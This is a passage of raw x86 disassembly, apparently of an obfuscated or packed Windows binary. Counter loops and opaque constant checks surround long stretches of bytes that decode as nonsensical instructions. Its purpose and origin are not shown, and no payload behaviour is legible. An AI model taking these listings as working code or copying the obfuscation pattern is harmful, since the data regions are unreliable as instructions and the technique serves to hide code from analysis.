  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e9ab
  4018bd:	cmp    DWORD PTR ds:0x4304e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4304e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4304e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42edd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42eddb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42eddb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42eddb,esi
  4018fe:	cmp    DWORD PTR ds:0x42eddb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ec0f
  401914:	cmp    DWORD PTR ds:0x42eddb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42eddb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42eddb,esi
  40192e:	cmp    DWORD PTR ds:0x42eddb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42edcb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4304db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4304db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4304db,esi
  401966:	cmp    DWORD PTR ds:0x4304db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4304db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e8b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea97
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43043d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430435,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430435
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430435,ebx
  4019c4:	cmp    DWORD PTR ds:0x430435,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e945
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e9bb
  4019e5:	cmp    DWORD PTR ds:0x430435,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x9d35fb86
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a70
  401a76:	and    ecx,edi
  401a78:	mov    BYTE PTR [eax],ch
  401a7a:	push   ecx
  401a7b:	fiadd  DWORD PTR [edi+0x480f5146]
  401a81:	adc    bl,0x8c
  401a84:	mov    eax,ds:0xd6e57dbf
  401a89:	sub    al,0x33
  401a8b:	dec    ebp
  401a8c:	mov    ds:0xe9dfc477,al
  401a91:	jnp    0x401b08
  401a93:	fisubr WORD PTR [eax]
  401a95:	popf   
  401a96:	adc    al,0x3a
  401a98:	push   cs
  401a99:	mov    al,0xa5
  401a9b:	xor    BYTE PTR [ecx+0x5c58132d],ah
  401aa1:	pop    esi
  401aa2:	ficomp DWORD PTR [eax+0x7f]
  401aa5:	cmp    BYTE PTR [esi+0x7f],al
  401aa8:	pop    edx
  401aa9:	shr    BYTE PTR [ecx+eiz*2-0x2c2bf615],1
  401ab0:	xchg   esp,eax
  401ab1:	jp     0x401aa0
  401ab3:	inc    esp
  401ab4:	cmc    
  401ab5:	in     eax,dx
  401ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ab7:	inc    ecx
  401ab8:	stos   BYTE PTR es:[edi],al
  401ab9:	mov    bl,BYTE PTR [edi]
  401abb:	daa    
  401abc:	and    BYTE PTR [edx],ah
  401abe:	push   eax
  401abf:	mov    bh,0xf3
  401ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ac2:	repnz scas al,BYTE PTR es:[edi]
  401ac4:	nop
  401ac5:	push   cs
  401ac6:	sub    ah,BYTE PTR [ebx+0x27]
  401ac9:	push   ebx
  401aca:	pop    ds
  401acb:	int    0xa5
  401acd:	out    dx,al
  401ace:	mov    cl,0xe1
  401ad0:	ds in  al,0xe1
  401ad3:	sub    edx,0xffffff99
  401ad6:	push   esp
  401ad7:	popf   
  401ad8:	imul   esi,DWORD PTR [edx],0xb3beebd4
  401ade:	mov    edx,eax
  401ae0:	int3   
  401ae1:	pop    ecx
  401ae2:	fisubr WORD PTR [ebp+0x2e]
  401ae5:	out    0x94,al
  401ae7:	xor    edx,DWORD PTR [esi]
  401ae9:	lahf   
  401aea:	stc    
  401aeb:	mov    cl,0x94
  401aed:	je     0x401b62
  401aef:	mov    al,ds:0xbdadcf7c
  401af4:	cmc    
  401af5:	sub    BYTE PTR [esi+0x5d],al
  401af8:	addr16 and eax,0x26ebba3f
  401afe:	loopne 0x401ad5
  401b00:	or     DWORD PTR [esi+0x16],0x69
  401b04:	mov    ebx,0x7ae63d3f
  401b09:	xchg   ebx,eax
  401b0a:	pushf  
  401b0b:	sahf   
  401b0c:	and    eax,0x1a685d14
  401b11:	fst    DWORD PTR [ebx+eax*1]
  401b14:	jmp    0x401b3f
  401b16:	sub    dh,ah
  401b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b19:	jo     0x401b2f
  401b1b:	sahf   
  401b1c:	xor    ah,ah
  401b1e:	push   ebx
  401b1f:	jge    0x401ae6
  401b21:	std    
  401b22:	loop   0x401b6c
  401b24:	jmp    0x14355ebe
  401b29:	xchg   BYTE PTR [eax],dh
  401b2b:	xchg   edx,eax
  401b2c:	popf   
  401b2d:	cmp    al,0x43
  401b2f:	cmovp  edx,DWORD PTR [esi]
  401b32:	aaa    
  401b33:	das    
  401b34:	ds out 0x23,al
  401b37:	jo     0x401adf
  401b39:	lods   al,BYTE PTR ds:[esi]
  401b3b:	retf   
  401b3c:	es (bad) 
  401b3e:	fsubr  st(7),st
  401b40:	cmp    al,0xed
  401b42:	or     dh,BYTE PTR [esi]
  401b44:	test   DWORD PTR [eax+edi*2-0xd],ebp
  401b48:	lods   eax,DWORD PTR ds:[esi]
  401b49:	hlt    
  401b4a:	lahf   
  401b4b:	adc    DWORD PTR [esp+eax*8],esi
  401b4e:	inc    esp
  401b4f:	push   ecx
  401b50:	mov    es,WORD PTR [ebx+0x32]
  401b53:	outs   dx,BYTE PTR ds:[esi]
  401b54:	pushf  
  401b55:	outs   dx,DWORD PTR ds:[esi]
  401b56:	dec    esi
  401b57:	mov    ebx,0x6a60293
  401b5c:	outs   dx,DWORD PTR ds:[esi]
  401b5d:	stos   DWORD PTR es:[edi],eax
  401b5e:	in     eax,dx
  401b5f:	xor    DWORD PTR [ebp+0x431a65aa],esp
  401b65:	js     0x401b17
  401b67:	cld    
  401b68:	jecxz  0x401bb8
  401b6a:	add    dl,BYTE PTR [esi]
  401b6c:	out    0xf,eax
  401b6e:	push   ebx
  401b6f:	test   DWORD PTR [ebx+0x2],edi
  401b72:	mov    ebx,0xa11a510
  401b77:	shr    dh,0x66
  401b7a:	xor    ecx,DWORD PTR [ecx]
  401b7c:	mov    eax,cs:0x1ebaf85c
  401b82:	aad    0x44
  401b84:	xchg   DWORD PTR [edx+eiz*2+0x1c],edx
  401b88:	dec    ecx
  401b89:	neg    DWORD PTR ds:0x927dad1
  401b8f:	push   ebx
  401b90:	scas   al,BYTE PTR es:[edi]
  401b91:	ror    BYTE PTR [ecx-0x64],1
  401b94:	popf   
  401b95:	out    dx,al
  401b96:	adc    eax,0xf2774fb0
  401b9b:	xor    BYTE PTR [ebx+0x2d],al
  401b9e:	bound  esp,QWORD PTR [ebp+0x78]
  401ba1:	adc    al,BYTE PTR [edx-0x2af56844]
  401ba7:	add    al,0x7a
  401ba9:	cmp    cl,dl
  401bab:	xchg   ebp,eax
  401bac:	sahf   
  401bad:	xchg   BYTE PTR [ebp+eiz*1-0x17505d6e],al
  401bb4:	ret    
  401bb5:	adc    ebp,DWORD PTR [ebx-0x5ef69fe1]
  401bbb:	call   0x29022619
  401bc0:	je     0x401ba3
  401bc2:	dec    eax
  401bc3:	jmp    0x401c32
  401bc5:	mov    edx,0xa8e027eb
  401bca:	imul   esp,ebx,0xcd5dff77
  401bd0:	scas   al,BYTE PTR es:[edi]
  401bd1:	jnp    0x401bdd
  401bd3:	stos   DWORD PTR es:[edi],eax
  401bd4:	int    0x79
  401bd6:	and    DWORD PTR [ecx],ebx
  401bd8:	call   0x80a3:0x9076629e
  401bdf:	jg     0x401bb2
  401be1:	sub    edi,0xd8660eef
  401be7:	sahf   
  401be8:	(bad)  
  401be9:	jecxz  0x401bbb
  401beb:	inc    eax
  401bec:	add    ecx,DWORD PTR [ecx+0x6f]
  401bef:	es push cs
  401bf1:	sub    eax,0x220871bd
  401bf6:	jae    0x401c0f
  401bf8:	sbb    DWORD PTR [edi],ebp
  401bfa:	das    
  401bfb:	fbld   TBYTE PTR [ecx+0x4e]
  401bfe:	pop    esi
  401bff:	sbb    al,0x1b
  401c01:	sbb    al,0xfe
  401c03:	shl    DWORD PTR cs:[esi],1
  401c06:	jmp    0xf1e2:0x7125fe32
  401c0d:	or     ecx,DWORD PTR es:[edi-0x57]
  401c11:	mov    ebx,edi
  401c13:	(bad)  
  401c14:	jg     0x401ba7
  401c16:	repz popa 
  401c18:	ins    BYTE PTR es:[edi],dx
  401c19:	ret    
  401c1a:	lea    eax,cs:[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	repz ret 
  401c92:	fist   WORD PTR [eax+0x7e7e0630]
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c6d
  401c9d:	inc    edi
  401c9e:	mov    edx,0x2e9f6e69
  401ca3:	fisttp DWORD PTR [ecx+0x75]
  401ca6:	jmp    0x401c51
  401ca8:	inc    esi
  401ca9:	jns    0x401c46
  401cab:	(bad)  
  401cac:	xchg   esi,eax
  401cad:	scas   al,BYTE PTR es:[di]
  401caf:	xor    DWORD PTR [esi+0x219f8df],ecx
  401cb5:	or     eax,0xdbe478d
  401cba:	lea    ebx,[ecx+0xc66e9ad]
  401cc0:	(bad)  
  401cc1:	ss (bad) 
  401cc3:	and    DWORD PTR [ebx],edx
  401cc5:	xchg   esp,eax
  401cc6:	pushf  
  401cc7:	pop    esi
  401cc8:	ins    BYTE PTR es:[edi],dx
  401cc9:	mov    ?,WORD PTR [edx-0x4944eb0e]
  401ccf:	jecxz  0x401c7c
  401cd1:	test   eax,0xfe051d96
  401cd6:	dec    esp
  401cd7:	fisubr WORD PTR [ebp+0x45]
  401cda:	scas   eax,DWORD PTR es:[edi]
  401cdb:	push   ss
  401cdc:	imul   esi,edi,0xb0e8b825
  401ce2:	shr    edx,0x5b
  401ce5:	mov    ebp,0xcd6ce5bc
  401cea:	out    0xc5,eax
  401cec:	mov    ebx,0x97efbc40
  401cf1:	jo     0x401cbd
  401cf3:	mov    bh,0x6d
  401cf5:	call   0x75cd5f0b
  401cfa:	or     BYTE PTR [ebx],al
  401cfc:	pop    es
  401cfd:	test   al,0x55
  401cff:	pop    DWORD PTR [eax-0x2d]
  401d02:	call   0x3a61907b
  401d07:	mov    al,0xd0
  401d09:	nop
  401d0a:	adc    al,0x92
  401d0c:	adc    eax,esi
  401d0e:	lea    eax,[ebp-0x554b52af]
  401d14:	fst    QWORD PTR [ecx+0x29587061]
  401d1a:	pop    esi
  401d1b:	jge    0x401cf3
  401d1d:	ss popf 
  401d1f:	xchg   DWORD PTR [ebx+0x5f],eax
  401d22:	out    0x67,eax
  401d24:	fisttp WORD PTR [ebp+esi*1-0x2d]
  401d28:	mov    ecx,0x3e0171dc
  401d2d:	das    
  401d2e:	cmp    esp,DWORD PTR [ebx-0x4b]
  401d31:	pop    ss
  401d32:	sub    al,0xc7
  401d34:	pusha  
  401d35:	or     DWORD PTR [ecx-0x16],eax
  401d38:	addr16 pop edi
  401d3a:	pop    edx
  401d3b:	and    ebx,esi
  401d3d:	out    0x3d,eax
  401d3f:	xchg   ecx,eax
  401d40:	push   ebp
  401d41:	pop    es
  401d42:	aas    
  401d43:	adc    bl,BYTE PTR [edi-0x1efd3462]
  401d49:	aad    0x8a
  401d4b:	outs   dx,BYTE PTR ds:[esi]
  401d4c:	(bad)  
  401d4d:	pop    ds
  401d4e:	cmp    BYTE PTR [esi],0x62
  401d51:	cli    
  401d52:	out    dx,eax
  401d53:	test   DWORD PTR [edx+0x60],esp
  401d56:	xor    eax,0x65b996a
  401d5b:	mov    dh,0x5f
  401d5d:	mov    ecx,0x6fe0c790
  401d62:	rcr    esp,0xda
  401d65:	xchg   edx,eax
  401d66:	popf   
  401d67:	xchg   edx,eax
  401d68:	mov    BYTE PTR ds:0x65eb5631,0xc6
  401d6f:	adc    al,0x47
  401d71:	or     BYTE PTR [edi],ah
  401d73:	xor    DWORD PTR [edx+0x39],ebp
  401d76:	bound  eax,QWORD PTR [eax]
  401d78:	mov    edx,0x56ab6e95
  401d7d:	mov    eax,0x692da29e
  401d82:	pop    ds
  401d83:	enter  0x404f,0xf8
  401d87:	pop    ecx
  401d88:	xchg   ecx,eax
  401d89:	bound  esp,QWORD PTR [ebp+0x18a59a45]
  401d8f:	rol    ch,cl
  401d91:	in     al,dx
  401d92:	mov    WORD PTR [ecx+0x1],?
  401d95:	ins    DWORD PTR es:[edi],dx
  401d96:	and    eax,0xbb2f554b
  401d9b:	sbb    eax,0x1837310d
  401da0:	loopne 0x401e0d
  401da2:	cdq    
  401da3:	test   DWORD PTR [eax-0x3f],edx
  401da6:	(bad)  
  401da7:	out    0xb0,al
  401da9:	dec    edi
  401daa:	ret    
  401dab:	call   0x1d17:0xf5f4a681
  401db2:	inc    edi
  401db3:	mov    ah,BYTE PTR [eax]
  401db5:	loop   0x401df6
  401db7:	cwde   
  401db8:	lock fwait
  401dba:	out    0x85,eax
  401dbc:	sbb    ebx,DWORD PTR [eax]
  401dbe:	test   eax,0x81a07c58
  401dc3:	xchg   edi,eax
  401dc4:	in     eax,0xb1
  401dc6:	test   esi,ebp
  401dc8:	adc    BYTE PTR [ebp+0x33],bh
  401dcb:	jae    0x401d5c
  401dcd:	xlat   BYTE PTR ds:[ebx]
  401dce:	sti    
  401dcf:	sub    dl,BYTE PTR [edx+eiz*1-0xc]
  401dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dd4:	ss aas 
  401dd6:	loopne 0x401d89
  401dd8:	cwde   
  401dd9:	pop    ecx
  401dda:	aaa    
  401ddb:	xchg   DWORD PTR [edx],esp
  401ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de0:	or     eax,0x527eab93
  401de5:	test   BYTE PTR [edi],dl
  401de7:	sbb    al,0xa0
  401de9:	sbb    dl,BYTE PTR [edx-0x7635cf7b]
  401def:	fs xchg edx,eax
  401df1:	lahf   
  401df2:	cmp    edi,DWORD PTR [edx+0x71fe41c8]
  401df8:	jg     0x401e61
  401dfa:	mov    ch,0xe1
  401dfc:	bound  ecx,QWORD PTR [esi+0x2ab77c4]
  401e02:	add    DWORD PTR [edi-0x5338afee],esi
  401e08:	ins    DWORD PTR es:[edi],dx
  401e09:	mov    ebx,0x65068b0d
  401e0e:	test   eax,0x80e9d5d9
  401e13:	jo     0x401e39
  401e15:	out    0xeb,eax
  401e17:	in     eax,dx
  401e18:	out    0xf4,al
  401e1a:	inc    esi
  401e1b:	fild   WORD PTR [eax-0x65da7262]
  401e21:	adc    BYTE PTR [edi],ch
  401e23:	xchg   esp,eax
  401e24:	push   es
  401e25:	dec    esp
  401e26:	lea    edi,[edx+0x1f40d66e]
  401e2c:	popf   
  401e2d:	fidiv  DWORD PTR [ebp-0x7f]
  401e30:	xor    DWORD PTR ds:0xa0bb0dea,edi
  401e36:	mov    eax,ds:0x4603506a
  401e3b:	cs (bad) 
  401e3e:	inc    esi
  401e3f:	sbb    edx,esp
  401e41:	push   esp
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	mov    esp,0x5ab36bdc
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e6e
  401e8d:	jmp    0x5e3a6745
  401e92:	or     edi,DWORD PTR [esi-0x78]
  401e95:	repnz or BYTE PTR [esi],0xb5
  401e99:	pop    esi
  401e9a:	xchg   edi,eax
  401e9b:	dec    ebx
  401e9c:	mov    edi,0xbccd1e9d
  401ea1:	imul   ecx,DWORD PTR [edx],0x9b82a37
  401ea7:	sub    BYTE PTR [ecx-0x29],ah
  401eaa:	mov    al,0x88
  401eac:	div    BYTE PTR [ebp-0x7c333238]
  401eb2:	fimul  DWORD PTR [esp+ebp*2+0x5f]
  401eb6:	mov    al,0xae
  401eb8:	mov    dh,0xe4
  401eba:	sub    bl,dl
  401ebc:	mov    eax,0x87269fee
  401ec1:	stos   BYTE PTR es:[edi],al
  401ec2:	jmp    0x2aa58d02
  401ec7:	adc    al,0xe3
  401ec9:	(bad)  
  401eca:	mov    al,ds:0xdc332a6c
  401ecf:	or     ch,BYTE PTR [edi]
  401ed1:	adc    esi,DWORD PTR [ecx]
  401ed3:	inc    esp
  401ed4:	rcr    dl,1
  401ed6:	jns    0x401eee
  401ed8:	xchg   ebp,eax
  401ed9:	push   edi
  401eda:	push   ds
  401edb:	pop    ebx
  401edc:	enter  0x94c3,0xdb
  401ee0:	adc    eax,0x16f07525
  401ee5:	loop   0x401f26
  401ee7:	jno    0x401f5f
  401ee9:	cdq    
  401eea:	pop    edx
  401eeb:	mov    BYTE PTR [edx-0x22],dh
  401eee:	test   DWORD PTR [ebp-0x25],esi
  401ef1:	sub    eax,0xdab559f3
  401ef6:	jae    0x401e91
  401ef8:	cli    
  401ef9:	fcom   QWORD PTR [edx+0x17]
  401efc:	jo     0x401e94
  401efe:	jle    0x401f11
  401f00:	sub    DWORD PTR [eax+0x62],esi
  401f03:	ds pusha 
  401f05:	mov    bl,0x83
  401f07:	pushf  
  401f08:	pusha  
  401f09:	retf   
  401f0a:	mov    esp,0x73fcfbe9
  401f0f:	in     eax,dx
  401f10:	dec    ebx
  401f11:	ret    
  401f12:	pop    ds
  401f13:	or     al,al
  401f15:	mov    ebp,0x9e096cbc
  401f1a:	repnz lea esi,[edi-0x298a2a8d]
  401f21:	xchg   esi,eax
  401f22:	daa    
  401f23:	sub    al,bl
  401f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f26:	repz lds esp,FWORD PTR [edx+0x1a9b78ad]
  401f2d:	mov    esp,0x6f8e75ac
  401f32:	jno    0x401ecf
  401f34:	inc    esi
  401f35:	mov    ah,0x60
  401f37:	leave  
  401f38:	xchg   esp,eax
  401f39:	addr16 add bh,dh
  401f3c:	lods   eax,DWORD PTR ds:[esi]
  401f3d:	add    ch,BYTE PTR [ecx-0x1beed8cb]
  401f43:	test   DWORD PTR [esi+0x0],0xf5a1a167
  401f4a:	jmp    0xa0549b05
  401f4f:	jmp    0x5b51:0x691121a8
  401f56:	sahf   
  401f57:	sti    
  401f58:	imul   ecx,DWORD PTR ds:0x7c2f362a,0x6d109355
  401f62:	rcr    DWORD PTR [esi],1
  401f64:	adc    eax,0x8dcf1909
  401f69:	stos   BYTE PTR es:[edi],al
  401f6a:	jle    0x401fe7
  401f6c:	test   al,0xf5
  401f6e:	outs   dx,BYTE PTR ds:[esi]
  401f6f:	ret    0x5d92
  401f72:	add    DWORD PTR [esi],ebx
  401f74:	mov    edi,0xc137dec2
  401f79:	and    ch,BYTE PTR [esi+ebp*4]
  401f7c:	addr16 das 
  401f7e:	and    eax,0x105b6a3a
  401f83:	out    0x38,al
  401f85:	push   ss
  401f86:	imul   ebp,DWORD PTR [ebx+0x4a29aa1e],0x68
  401f8d:	mov    esp,0xde88e282
  401f92:	mov    eax,0x3e3f0c03
  401f97:	mov    eax,ds:0xa9c4d4da
  401f9c:	xchg   ebx,eax
  401f9d:	sbb    DWORD PTR [eax+0x449e7125],0xffffffa8
  401fa4:	dec    eax
  401fa5:	ins    DWORD PTR es:[edi],dx
  401fa6:	leave  
  401fa7:	add    eax,0xe5147fa7
  401fac:	aad    0x4d
  401fae:	loope  0x402025
  401fb0:	outs   dx,DWORD PTR ds:[esi]
  401fb1:	mov    bl,0xbf
  401fb3:	cmp    esi,DWORD PTR ds:0xb38f0acd
  401fb9:	repnz aaa 
  401fbb:	add    ebx,DWORD PTR [esi+0x24]
  401fbe:	punpckhwd mm3,mm3
  401fc1:	fiadd  WORD PTR [ebx+0x30c2d634]
  401fc7:	js     0x401f51
  401fc9:	sub    esp,eax
  401fcb:	mov    esi,DWORD PTR [edx+eiz*2]
  401fce:	aam    0x91
  401fd0:	jbe    0x401fcc
  401fd2:	dec    edx
  401fd3:	sub    al,BYTE PTR [edi]
  401fd5:	fstp   TBYTE PTR cs:[ecx-0x49610b74]
  401fdc:	(bad)  [ebx]
  401fde:	ss cs push sp
  401fe2:	mov    eax,?
  401fe4:	mov    ds:0x1c50938d,al
  401fe9:	and    eax,0xc73d9f52
  401fee:	fdivr  DWORD PTR [ebp+0x43]
  401ff1:	adc    ecx,esi
  401ff3:	sub    DWORD PTR ds:0x8f6a69de,ebx
  401ff9:	outs   dx,DWORD PTR ds:[esi]
  401ffa:	cmp    edi,DWORD PTR [esi-0x6899b02a]
  402000:	and    al,0x23
  402002:	(bad)  
  402003:	sbb    cl,BYTE PTR [ecx+0x5f9510df]
  402009:	bndldx bnd0,[edx+0x7b819beb]
  402010:	mov    edx,0xf58fd662
  402015:	sbb    DWORD PTR [edx-0x5ee9c679],edi
  40201b:	fild   QWORD PTR [ebx+0x656e5bbe]
  402021:	(bad)  [edi-0x760da4a6]
  402027:	xchg   ebx,eax
  402028:	mov    dh,0x2c
  40202a:	jnp    0x40209c
  40202c:	cmp    BYTE PTR [edi],ah
  40202e:	jae    0x40206d
  402030:	inc    ebp
  402031:	pushf  
  402032:	add    eax,esi
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	dec    ecx
  4020e5:	pusha  
  4020e6:	inc    esi
  4020e7:	aam    0x84
  4020e9:	add    eax,0x7f557e7e
  4020ee:	jle    0x40216e
  4020f0:	shl    ecx,0x31
  4020f3:	sti    
  4020f4:	bound  ebp,QWORD PTR [edx-0x252d93f3]
  4020fa:	xor    edx,esp
  4020fc:	(bad)  
  4020fe:	popa   
  4020ff:	stos   DWORD PTR es:[edi],eax
  402100:	mov    cl,0x2
  402102:	mov    ebx,0x214def74
  402107:	mov    DWORD PTR [edi-0x71a816d5],edx
  40210d:	out    dx,al
  40210e:	add    BYTE PTR [ebx+0x4],dl
  402111:	outs   dx,BYTE PTR ds:[esi]
  402112:	mov    esi,DWORD PTR [esi]
  402114:	mov    ch,0x7d
  402116:	imul   edx,DWORD PTR [eax+0x3d],0xd4613a74
  40211d:	int3   
  40211e:	pop    ecx
  40211f:	rol    DWORD PTR [eax+ebp*2+0x1c],cl
  402123:	cdq    
  402124:	sbb    BYTE PTR [esi],bl
  402126:	xchg   esp,eax
  402127:	xchg   DWORD PTR [edx+edi*2],edi
  40212a:	call   0x40f46a97
  40212f:	push   ebx
  402130:	fnstenv ds:0xbe6be965
  402136:	addr16 xchg esp,eax
  402138:	mov    eax,0x5e23def5
  40213d:	lds    ebp,FWORD PTR [edi]
  40213f:	sbb    ebp,DWORD PTR [ecx+0x55]
  402142:	jmp    0x40216d
  402144:	std    
  402145:	xchg   ecx,eax
